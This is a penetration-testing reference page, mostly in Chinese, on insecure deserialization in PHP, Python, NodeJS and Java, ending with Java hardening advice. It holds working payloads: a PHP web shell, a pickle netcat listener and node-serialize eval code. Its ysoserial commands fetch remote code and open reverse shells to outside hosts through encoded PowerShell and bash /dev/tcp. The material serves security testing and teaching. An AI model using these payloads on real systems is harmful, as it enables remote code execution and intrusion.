# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

**Serialization** 指将对象转换为可保存的格式的方式，目的是将对象存储起来或作为通信过程的一部分进行传输。该技术通常用于确保对象能够在以后被重建，同时保持其结构和状态。

**Deserialization** 则相反，是与 serialization 相对的过程。它涉及将以特定格式组织的数据重新构造成对象。

Deserialization 可能很危险，因为它可能会 **允许攻击者篡改 serialized 数据以执行恶意代码** 或在对象重建过程中导致应用出现意外行为。

## PHP

在 PHP 中，特定的魔术方法在 serialization 和 deserialization 过程中被调用：

- `__sleep`: 在对象被 serialized 时调用。该方法应返回一个包含应被 serialized 的对象属性名称的数组。它通常用于提交未完成的数据或执行类似的清理任务。
- `__wakeup`: 在对象被 deserialized 时调用。用于重新建立在 serialization 过程中可能丢失的数据库连接，并执行其他重新初始化任务。
- `__unserialize`: 当对象被 deserialized 时，如果该方法存在，它将代替 `__wakeup` 被调用。与 `__wakeup` 相比，它在 deserialization 过程中提供了更多的控制。
- `__destruct`: 当对象即将被销毁或脚本结束时调用。通常用于清理工作，例如关闭文件句柄或数据库连接。
- `__toString`: 该方法允许将对象视为字符串。它可以根据内部调用的函数用于读取文件或执行其他任务，从而为对象提供文本表示。
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
如果查看结果，你会看到在对象被反序列化时会调用函数 **`__wakeup`** 和 **`__destruct`**。注意，在许多教程中你会发现当尝试打印某个属性时会调用 **`__toString`** 函数，但显然这**不再发生了**。

> [!WARNING]
> 如果类实现了方法 **`__unserialize(array $data)`**，那么会调用该方法来**代替 `__wakeup()`**。它允许你通过将序列化数据作为数组提供来反序列化对象。你可以使用此方法来反序列化属性并在反序列化时执行任何必要的操作。
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

你可以在此阅读一个讲解的 **PHP 示例**： [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)，这里 [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) 或 这里 [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

你可以滥用 PHP autoload 功能来加载任意 php 文件及更多内容：


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### 序列化引用的值

如果出于某种原因你想将一个值序列化为对另一个已序列化值的**引用**，你可以：
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### 使用 `allowed_classes` 防止 PHP Object Injection

> [!INFO]
> 对 `unserialize()` 的 **第二个参数**（`$options` 数组）的支持是在 **PHP 7.0** 中添加的。在较旧的版本中，该函数仅接受序列化字符串，因此无法限制哪些类可以被实例化。

`unserialize()` 会在序列化流中遇到的每个类都**实例化**，除非另有指示。自 PHP 7 起，该行为可以通过 [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) 选项来限制：
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
如果 **`allowed_classes` 被省略 _或_ 代码在 PHP < 7.0 上运行**，该调用将变得 **危险**，攻击者可以构造一个 payload，滥用诸如 `__wakeup()` 或 `__destruct()` 等魔术方法，从而实现 Remote Code Execution (RCE)。

#### 实际案例：Everest Forms (WordPress) CVE-2025-52709

该 WordPress 插件 **Everest Forms ≤ 3.2.2** 试图使用一个 helper wrapper 进行防护，但忽视了旧版 PHP：
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
在仍运行 **PHP ≤ 7.0** 的服务器上，当管理员打开一个恶意的表单提交时，这个第二分支会导致经典的 **PHP Object Injection**。一个最小的 exploit payload 可能看起来像：
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
一旦管理员查看该条目，对象就被实例化并且 `SomeClass::__destruct()` 被执行，导致任意代码执行。

**要点**
1. 调用 `unserialize()` 时始终传入 `['allowed_classes' => false]`（或严格的白名单）。
2. 审计防御性封装——它们经常忘记遗留的 PHP 分支。
3. 仅仅升级到 **PHP ≥ 7.x** 并不足够：仍需显式提供该选项。

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) 可以帮助你生成 payloads 以滥用 PHP deserializations。\
注意，在若干情况下你**可能无法在应用的源代码中找到滥用 deserialization 的方法**，但你可能能够**滥用外部 PHP 扩展的代码。**\
因此，如果可以，检查服务器的 `phpinfo()` 并**在互联网上搜索**（甚至在 **PHPGGC** 的 **gadgets** 中）你可能能滥用的某些 gadget。

### phar:// metadata deserialization

如果你发现一个 LFI 只是读取文件而不执行其中的 php 代码，例如使用像 _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_** 这样的函数。你可以尝试在使用 **phar** 协议读取 **file** 时滥用发生的 **deserialization**。\
更多信息请阅读下面的文章：


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

当对象被 unpickle 时，函数 \_\_\_reduce\_\_\_ 会被执行。\
当被利用时，服务器可能返回一个错误。
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
在查看绕过技术之前，如果你在运行 python3，尝试使用 `print(base64.b64encode(pickle.dumps(P(),2)))` 来生成一个与 python2 兼容的对象。

关于如何从 **pickle jails** 逃脱的更多信息，请查看：


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

下面页面介绍了在 yaml Python 库中**滥用不安全反序列化**的技术，并以一个可用于生成用于 **Pickle, PyYAML, jsonpickle and ruamel.yaml** 的 RCE 反序列化 payload 的工具作为结尾：


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions**，不像 PHP 或 Python 那样会在仅创建对象时被执行。但它有一些 **函数**，即使不直接调用也会**被频繁使用**，例如 **`toString`**, **`valueOf`**, **`toJSON`**。\
如果在滥用反序列化时你能**破坏这些函数以执行其他代码**（可能利用 prototype pollutions），那么在它们被调用时就可以执行任意代码。

另一种在不直接调用的情况下触发函数的 **"magic" 方法** 是通过 **破坏由 async function 返回的对象**（promise）。因为如果你将那个**返回对象**转换为另一个带有名为 **"then" 的函数类型属性**的 **promise**，它就会**被执行**，仅仅因为它是由另一个 promise 返回的。_Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

如果你想了解该技术，**请参阅以下教程**：


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

该库允许序列化函数。示例：
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**序列化对象**将如下所示：
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
You can see in the example that when a function is serialized the `_$$ND_FUNC$$_` flag is appended to the serialized object.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

As you may see in the last chunk of code, **if the flag is found** `eval` is used to deserialize the function, so basically **user input if being used inside the `eval` function**.

However, **just serialising** a function **won't execute it** as it would be necessary that some part of the code is **calling `y.rce`** in our example and that's highly **unlikable**.\
Anyway, you could just **modify the serialised object** **adding some parenthesis** in order to auto execute the serialized function when the object is deserialized.\
In the next chunk of code **notice the last parenthesis** and how the `unserialize` function will automatically execute the code:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
如前所述，该库会获取`_$$ND_FUNC$$_`之后的代码并使用`eval`**执行它**。因此，为了**自动执行代码**，你可以**删除函数创建**部分和最后一个括号，并**只执行一个 JS oneliner**，如下面示例：
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
关于如何利用此漏洞的 **更多信息**，请见 [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)。

### [funcster](https://www.npmjs.com/package/funcster)

一个值得注意的方面是 **funcster** 无法访问 **标准内置对象**；它们位于可访问作用域之外。这个限制阻止了试图在内置对象上调用方法的代码执行，当使用像 `console.log()` 或 `require(something)` 这样的命令时，会导致诸如 "ReferenceError: console is not defined" 的异常。

尽管有此限制，但通过特定的方法可以恢复对全局上下文（包括所有标准内置对象）的完全访问。通过直接利用全局上下文，可以绕过此限制。例如，可以使用以下代码片段重新建立访问：
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**有关更多信息，请阅读此来源**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

该 **serialize-javascript** 包专为序列化目的设计，不包含任何内置的反序列化功能。用户需自行实现反序列化的方法。官方示例建议直接使用 `eval` 来对序列化数据进行反序列化：
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
如果此函数用于 deserialize objects，你可以 **easily exploit it**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**有关**[ **更多信息请阅读此来源**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

在以下页面您可以找到关于如何滥用此库以执行任意命令的信息：

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

在 Java 中，**deserialization callbacks are executed during the process of deserialization**。攻击者可以通过构造触发这些回调的恶意 payload 来利用这一点，从而可能执行有害操作。

### 指纹

#### White Box

要在代码库中识别潜在的序列化漏洞，请搜索：

- 实现 `Serializable` 接口的类。
- 使用 `java.io.ObjectInputStream`、`readObject`、`readUnshare` 等函数。

特别注意：

- `XMLDecoder` 在参数由外部用户定义时的使用。
- `XStream` 的 `fromXML` 方法，尤其是当 XStream 版本小于或等于 1.46 时，因为它容易受到序列化问题的影响。
- `ObjectInputStream` 与 `readObject` 方法的组合。
- `readObject`、`readObjectNodData`、`readResolve` 或 `readExternal` 等方法的实现。
- `ObjectInputStream.readUnshared`。
- 广泛使用 `Serializable`。

#### Black Box

对于 black box 测试，请寻找表明 java 序列化对象（来自 `ObjectInputStream`）的特定 **signatures or "Magic Bytes"**：

- 十六进制模式：`AC ED 00 05`。
- Base64 模式：`rO0`。
- HTTP 响应头中 `Content-type` 设置为 `application/x-java-serialized-object`。
- 表示先前压缩的十六进制模式：`1F 8B 08 00`。
- 表示先前压缩的 Base64 模式：`H4sIA`。
- 具有 `.faces` 扩展名的 Web 文件和 `faces.ViewState` 参数。在 Web 应用中发现这些模式应促使按照 [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) 中的详细说明进行检查。
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### 检查是否存在漏洞

如果你想 **learn about how does a Java Deserialized exploit work**，你应该查看 [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), 和 [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)。

#### SignedObject 保护的反序列化与预认证可达性

现代代码库有时会用 `java.security.SignedObject` 包裹反序列化，并在调用 `getObject()`（反序列化内部对象）之前验证签名。这能阻止任意顶层 gadget classes，但如果攻击者能获得有效签名（e.g., private-key compromise or a signing oracle），仍可能被利用。此外，错误处理流程可能会为未认证用户生成 session-bound tokens，从而在 pre-auth 情况下暴露原本受保护的 sinks。

对于包含请求、IoCs 和加固建议的具体案例研究，请参见：

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### 白盒测试

你可以检查系统中是否安装了任何具有已知漏洞的应用。
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **检查所有已知有漏洞并且 [**Ysoserial** ](https://github.com/frohoff/ysoserial) 能提供利用程序的库。** 或者你可以检查 [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) 上列出的库。\
你也可以使用 [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) 来搜索可能被利用的 gadget chains。\
运行 **gadgetinspector**（构建后）时不要在意大量的警告/错误，等它完成。它会将所有发现写入 _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_。请注意，**gadgetinspector 不会创建利用代码，并且可能存在误报**。

#### 黑盒测试

使用 Burp 扩展 [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) 可以识别 **有哪些库可用**（甚至包括版本）。有了这些信息，选择合适的 payload 来利用漏洞会更**容易**。\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe 专注于 **`ObjectInputStream` 反序列化**。

使用 Burp 扩展 [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) ，你可以 **识别可被 ysoserial 利用的易受攻击库** 并对其进行 **利用**。\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner 专注于 **`ObjectInputStream`** 反序列化。

你也可以使用 [**Freddy**](https://github.com/nccgroup/freddy) 在 **Burp** 中 **检测反序列化** 漏洞。该插件不仅能检测与 **`ObjectInputStream`** 相关的漏洞，还能检测来自 **Json** 和 **Yml** 反序列化库的漏洞。在主动模式下，它会尝试使用 sleep 或 DNS payloads 来确认它们。\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

序列化测试

并非所有情况都只是检查服务器是否使用了易受攻击的库。有时你可以**修改序列化对象中的数据以绕过某些校验**（例如可能获得 webapp 的管理员权限）。\
如果你发现有 java 序列化对象被发送到 Web 应用，**你可以使用** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **以更可读的格式打印所发送的序列化对象**。知道你发送了哪些数据后，就更容易修改它并绕过某些校验。

### **Exploit**

#### **ysoserial**

利用 Java 反序列化的主要工具是 [**ysoserial**](https://github.com/frohoff/ysoserial)（[**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)）。你也可以考虑使用 [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)，它允许你使用复杂命令（例如带管道的命令）。\
注意该工具主要针对 **`ObjectInputStream`** 的利用。\
建议在尝试 RCE payload 前先使用 **"URLDNS"** payload 来测试注入是否可行。无论如何，要注意可能 "URLDNS" payload 无效，但其它 RCE payload 有效。
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
在为 **java.lang.Runtime.exec()** 创建 payload 时，你 **不能使用特殊字符**（如 ">" 或 "|"）来重定向执行输出，不能使用 "$()" 来执行命令，甚至不能通过 **空格** 分隔来 **传递参数** 给命令（你可以执行 `echo -n "hello world"`，但不能执行 `python2 -c 'print "Hello world"'`）。为了正确编码 payload，你可以 [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html)。

随意使用下面的脚本来创建 **all the possible code execution** payloads，适用于 Windows 和 Linux，然后在有漏洞的网页上测试它们：
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

你可以 **使用** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **结合 ysoserial 来创建更多 exploits**。关于该工具的更多信息见该工具发表时的 **演讲幻灯片**： [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) 可用于生成 payloads 来 exploit Java 中不同的 **Json** 和 **Yml** 序列化库。\
为了编译该项目，我需要在 `pom.xml` 中 **添加** 这些 **依赖项**：
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**安装 maven**, 并 **编译** 项目:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

阅读有关此 Java JSON 库的更多内容： [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

- 如果你想测试一些 ysoserial payloads，可以**运行此 webapp**： [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java 在许多场景中大量使用序列化，例如：

- **HTTP requests**：序列化广泛用于参数管理、ViewState、cookies 等。
- **RMI (Remote Method Invocation)**：Java RMI 协议完全依赖序列化，是 Java 应用远程通信的基石。
- **RMI over HTTP**：此方法常被基于 Java 的 thick client web 应用使用，利用序列化进行所有对象通信。
- **JMX (Java Management Extensions)**：JMX 使用序列化在网络上传输对象。
- **Custom Protocols**：在 Java 中，常见做法是传输原始 Java 对象，后续示例漏洞将演示这一点。

### Prevention

#### Transient objects

实现了 `Serializable` 的类可以将类中不应被序列化的对象声明为 `transient`。例如：
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### 避免序列化需要实现 `Serializable` 的类

在某些情况下，由于类继承关系，某些**对象必须实现 `Serializable`** 接口，这会导致意外反序列化的风险。为防止这种情况，应通过定义一个始终抛出异常的 `final` `readObject()` 方法，使这些对象不可反序列化，示例如下：
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **在 Java 中增强 deserialization 安全性**

**Customizing `java.io.ObjectInputStream`** 是一种实用的方法来保护 deserialization 过程。该方法适用于：

- deserialization 代码由你控制。
- 预期用于 deserialization 的类是已知的。

重写 **`resolveClass()`** 方法以将 deserialization 限制为仅允许的类。这样可以阻止除显式允许的类之外的任何类被 deserialization，例如下面的示例将 deserialization 限制为仅 `Bicycle` 类：
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** 在无法修改代码时提供一个后备解决方案。此方法主要用于 **blacklisting harmful classes**，通过 JVM 参数实现：
```
-javaagent:name-of-agent.jar
```
它提供了一种动态保护反序列化的方法，适用于无法立即修改代码的环境。

查看示例： [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**实现序列化过滤器**：Java 9 通过 **`ObjectInputFilter`** 接口引入了序列化过滤器，提供了一种强大的机制，用于指定序列化对象在被反序列化之前必须满足的条件。这些过滤器可以全局应用或针对单个流应用，为反序列化过程提供细粒度的控制。

要使用序列化过滤器，可以设置一个适用于所有反序列化操作的全局过滤器，或者为特定流动态配置过滤器。例如：
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Leveraging External Libraries for Enhanced Security**: Libraries such as **NotSoSerial**, **jdeserialize**, and **Kryo** offer advanced features for controlling and monitoring Java deserialization. These libraries can provide additional layers of security, such as whitelisting or blacklisting classes, analyzing serialized objects before deserialization, and implementing custom serialization strategies.

- **NotSoSerial** intercepts deserialization processes to prevent execution of untrusted code.
- **jdeserialize** allows for the analysis of serialized Java objects without deserializing them, helping identify potentially malicious content.
- **Kryo** is an alternative serialization framework that emphasizes speed and efficiency, offering configurable serialization strategies that can enhance security.

### 参考资料

